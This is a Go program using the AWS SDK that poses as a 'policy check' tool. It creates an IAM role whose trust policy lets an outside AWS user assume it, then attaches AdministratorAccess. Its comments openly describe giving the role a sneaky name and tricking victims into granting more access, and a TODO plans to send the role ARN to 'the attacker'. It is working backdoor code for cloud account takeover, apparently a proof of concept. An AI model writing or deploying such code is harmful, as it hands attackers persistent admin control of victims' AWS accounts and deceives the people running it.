package main

import (
	"fmt"
	"os"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/arn"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/iam"
	"github.com/aws/aws-sdk-go/service/sts"
)

func main() {
	sess := session.New()

	// aws sts get-caller-identity
	stsSvc := sts.New(sess)
	callerIdentity, err := stsSvc.GetCallerIdentity(&sts.GetCallerIdentityInput{})
	if err != nil {
		fmt.Println("failed call to GetCallerIdentity:", err)
		os.Exit(1)
	}
	callerIdentityARN, err := arn.Parse(*callerIdentity.Arn)
	if err != nil {
		fmt.Println("failed to parse GetCallerIdentity ARN:", err)
		os.Exit(1)
	}
	fmt.Printf("Running as %s\n", callerIdentityARN)

	// https://signin.aws.amazon.com/switchrole?roleName=policy-check&account=180466524585
	iamSvc := iam.New(sess)
	roleOutput, err := iamSvc.CreateRole(&iam.CreateRoleInput{
		Description: aws.String("Enable policy checks."), // Give it a sneaky name.
		RoleName:    aws.String("policy-check"),
		//TODO: Download a list of exploited principals, don't use your own account.
		AssumeRolePolicyDocument: aws.String(`{
  "Version": "2012-10-17",
  "Statement": [
      {
          "Effect": "Allow",
          "Principal": { "AWS": "arn:aws:iam::180466524585:user/adrian" },
          "Action": "sts:AssumeRole"
      }
  ]
}
`),
	})
	if err != nil {
		exit := true
		if awsErr, ok := err.(awserr.Error); ok {
			if awsErr.Code() == "EntityAlreadyExists" {
				exit = false
			}
		}
		// Try to trick victims into giving more access.
		if exit {
			fmt.Println("failed to check policies, grant iam:* to the user to enable policy checks:", err)
			os.Exit(1)
		}
	}
	// Attach Admin policy.
	_, err = iamSvc.AttachRolePolicy(&iam.AttachRolePolicyInput{
		RoleName:  aws.String("policy-check"),
		PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAccess"),
	})
	if err != nil {
		// Try to trick victims into giving more access.
		fmt.Println("failed to give policy-check approriate access, policy check requires AdministratorAccess:", err)
		os.Exit(1)
	}

	//TODO: Send the new role ARN, or just the account ID to the attacker (me!) via HTTP or some other mechanism.
	if roleOutput != nil && roleOutput.Role != nil && roleOutput.Role.Arn != nil {
		fmt.Printf("Role: %s\n", *roleOutput.Role.Arn)
	}
}
